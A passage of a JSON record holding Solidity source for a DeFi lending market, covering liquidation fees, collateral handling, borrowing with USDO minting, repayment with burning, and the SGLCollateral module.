minAssetMount, address(this), \"\");\n        uint256 balanceAfter = yieldBox.balanceOf(address(this), assetId);\n\n        uint256 returnedShare = balanceAfter - balanceBefore;\n        (uint256 feeShare, uint256 callerShare) = _extractLiquidationFees(\n            returnedShare,\n            borrowShare,\n            callerReward\n        );\n        address[] memory _users = new address[](1);\n        _users[0] = user;\n        emit Liquidated(\n            msg.sender,\n            _users,\n            callerShare,\n            feeShare,\n            borrowAmount,\n            collateralShare\n        );\n    }\n\n    function _extractLiquidationFees(\n        uint256 returnedShare,\n        uint256 borrowShare,\n        uint256 callerReward\n    ) private returns (uint256 feeShare, uint256 callerShare) {\n        uint256 extraShare = returnedShare - borrowShare;\n        feeShare = (extraShare * protocolFee) / FEE_PRECISION; // x% of profit goes to fee.\n        callerShare = (extraShare * callerReward) / FEE_PRECISION; //  y%  of profit goes to caller.\n\n        yieldBox.transfer(address(this), penrose.feeTo(), assetId, feeShare);\n        yieldBox.transfer(address(this), msg.sender, assetId, callerShare);\n    }\n\n    /// @notice Handles the liquidation of users' balances, once the users' amount of collateral is too low.\n    /// @dev Closed liquidations Only, 90% of extra shares goes to caller and 10% to protocol\n    /// @param users An array of user addresses.\n    /// @param maxBorrowParts A one-to-one mapping to `users`, contains maximum (partial) borrow amounts (to liquidate) of the respective user.\n    /// @param swapper Contract address of the `MultiSwapper` implementation. See `setSwapper`.\n    /// @param swapData Swap necessar data\n    function _closedLiquidation(\n        address[] calldata users,\n        uint256[] calldata maxBorrowParts,\n        ISwapper swapper,\n        uint256 _exchangeRate,\n        bytes calldata swapData\n    ) private {\n        uint256 liquidatedCount = 0;\n        for (uint256 i = 0; i < users.length; i++) {\n            address user = users[i];\n            if (!_isSolvent(user, _exchangeRate)) {\n                liquidatedCount++;\n                _liquidateUser(\n                    user,\n                    maxBorrowParts[i],\n                    swapper,\n                    _exchangeRate,\n                    swapData\n                );\n            }\n        }\n\n        require(liquidatedCount > 0, \"SGL: no users found\");\n    }\n\n    /// @dev Helper function to move tokens.\n    /// @param from Account to debit tokens from, in `yieldBox`.\n    /// @param _tokenId The ERC-20 token asset ID in yieldBox.\n    /// @param share The amount in shares to add.\n    /// @param total Grand total amount to deduct from this contract's balance. Only applicable if `skim` is True.\n    /// Only used for accounting checks.\n    /// @param skim If True, only does a balance check on this contract.\n    /// False if tokens from msg.sender in `yieldBox` should be transferred.\n    function _addTokens(\n        address from,\n        uint256 _tokenId,\n        uint256 share,\n        uint256 total,\n        bool skim\n    ) internal {\n        if (skim) {\n            require(\n                share <= yieldBox.balanceOf(address(this), _tokenId) - total,\n                \"BigBang: too much\"\n            );\n        } else {\n            yieldBox.transfer(from, address(this), _tokenId, share);\n        }\n    }\n\n    /// @dev Concrete implementation of `removeCollateral`.\n    function _removeCollateral(\n        address from,\n        address to,\n        uint256 share\n    ) internal {\n        userCollateralShare[from] -= share;\n        totalCollateralShare -= share;\n        emit LogRemoveCollateral(from, to, share);\n        yieldBox.transfer(address(this), to, collateralId, share);\n    }\n\n    /// @dev Concrete implementation of `repay`.\n    function _repay(\n        address from,\n        address to,\n        uint256 part\n    ) internal returns (uint256 amount) {\n        (totalBorrow, amount) = totalBorrow.sub(part, true);\n\n        userBorrowPart[to] -= part;\n\n        uint256 toWithdraw = (amount - part); //acrrued\n        uint256 toBurn = amount - toWithdraw;\n        yieldBox.withdraw(assetId, from, address(this), amount, 0);\n        //burn USDO\n        if (toBurn > 0) {\n            IUSDOBase(address(asset)).burn(address(this), toBurn);\n        }\n\n        emit LogRepay(from, to, amount, part);\n    }\n\n    /// @dev Concrete implementation of `borrow`.\n    function _borrow(\n        address from,\n        address to,\n        uint256 amount\n    ) internal returns (uint256 part, uint256 share) {\n        uint256 feeAmount = (amount * borrowOpeningFee) / FEE_PRECISION; // A flat % fee is charged for any borrow\n\n        (totalBorrow, part) = totalBorrow.add(amount + feeAmount, true);\n        require(\n            totalBorrowCap == 0 || totalBorrow.elastic <= totalBorrowCap,\n            \"BigBang: borrow cap reached\"\n        );\n\n        userBorrowPart[from] += part;\n\n        //mint USDO\n        IUSDOBase(address(asset)).mint(address(this), amount);\n\n        //deposit borrowed amount to user\n        asset.approve(address(yieldBox), amount);\n        yieldBox.depositAsset(assetId, address(this), to, amount, 0);\n\n        share = yieldBox.toShare(assetId, amount, false);\n\n        emit LogBorrow(from, to, amount, feeAmount, part);\n    }\n\n    function _updateBorrowAndCollateralShare(\n        address user,\n        uint256 maxBorrowPart,\n        uint256 _exchangeRate\n    )\n        private\n        returns (\n            uint256 borrowAmount,\n            uint256 borrowPart,\n            uint256 collateralShare\n        )\n    {\n        uint256 collateralPartInAsset = (yieldBox.toAmount(\n            collateralId,\n            userCollateralShare[user],\n            false\n        ) * EXCHANGE_RATE_PRECISION) / _exchangeRate;\n\n        uint256 borrowAssetDecimals = asset.safeDecimals();\n        uint256 collateralDecimals = collateral.safeDecimals();\n\n        uint256 availableBorrowPart = computeClosingFactor(\n            userBorrowPart[user],\n            collateralPartInAsset,\n            borrowAssetDecimals,\n            collateralDecimals,\n            FEE_PRECISION_DECIMALS\n        );\n        borrowPart = maxBorrowPart > availableBorrowPart\n            ? availableBorrowPart\n            : maxBorrowPart;\n\n        if (borrowPart > userBorrowPart[user]) {\n            borrowPart = userBorrowPart[user];\n        }\n\n        userBorrowPart[user] = userBorrowPart[user] - borrowPart;\n\n        borrowAmount = totalBorrow.toElastic(borrowPart, false);\n        uint256 amountWithBonus = borrowAmount +\n            (borrowAmount * liquidationMultiplier) /\n            FEE_PRECISION;\n        collateralShare = yieldBox.toShare(\n            collateralId,\n            (amountWithBonus * _exchangeRate) / EXCHANGE_RATE_PRECISION,\n            false\n        );\n        if (collateralShare > userCollateralShare[user]) {\n            collateralShare = userCollateralShare[user];\n        }\n        userCollateralShare[user] -= collateralShare;\n        require(borrowAmount != 0, \"SGL: solvent\");\n\n        totalBorrow.elastic -= uint128(borrowAmount);\n        totalBorrow.base -= uint128(borrowPart);\n    }\n}"
    },
    {
      "filename": "contracts/markets/singularity/SGLCollateral.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.18;\n\nimport \"./SGLLendingCommon.sol\";\n\n/// @title Singularity collateral module\n/// @notice Singularity module for collateral type actions\ncontract SGLCollateral is SGLLendingCommon {\n    using RebaseLibrary for Rebase;\n    using BoringERC20 for IERC20;\n\n    // ************************ //\n    // *** PUBLIC FUNCTIONS *** //\n    // ************************ //\n    /// @notice Adds `collateral` from msg.sender to the account `to`.\n    /// @param from Account to transfer shares from.\n    /// @param to The receiver of the tokens.\n    /// @param skim True if the amount should be skimmed from the deposit balance of msg.sender.\n    /// False if tokens from msg.sender in `yieldBox` should be transferred.\n    /// @param share The amount of shares to add for `to`.\n    function addCollateral(\n        address from,\n        address to,\n        bool skim,\n        uint256 amount,\n        uint256 share\n    ) public notPaused allowedBorrow(from, share) {\n        _addCollateral(from, to, skim, amount, share);\n    }\n\n    /// @notice Removes `share` amount of collateral and transfers it to `to`.\n    /// @param from Account to debit collateral from.\n    /// @param to The receiver of the shares.\n    /// @param share Amount of shares to remove.\n    function removeCollateral(\n        address from,\n        address to,\n        uint256 share\n    ) public notPaused solvent(from) allowedBorrow(from, share) {\n        _removeCollateral(from, to, share);\n    }\n}"
    }
  ]
}